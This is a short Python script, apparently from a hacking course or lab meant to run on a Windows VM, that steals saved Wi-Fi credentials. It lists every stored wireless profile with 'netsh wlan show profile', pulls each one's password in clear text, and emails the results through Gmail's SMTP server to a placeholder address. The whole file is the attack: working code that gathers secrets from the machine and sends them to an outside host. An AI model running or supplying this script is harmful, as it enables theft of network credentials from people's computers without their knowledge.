#!/usr/bin/env python3

# Copy this script to the Windows VM and execute

import re  # https://docs.python.org/3/library/re.html
import smtplib  # https://docs.python.org/3/library/smtplib.html
import subprocess  # https://docs.python.org/3/library/subprocess.html


def send_mail(email, password, message):

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\\s*:\\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile %s key=clear" % network_name
    # Get for each and every network saved in the system
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result


send_mail("username@gmail.com", "password", result)
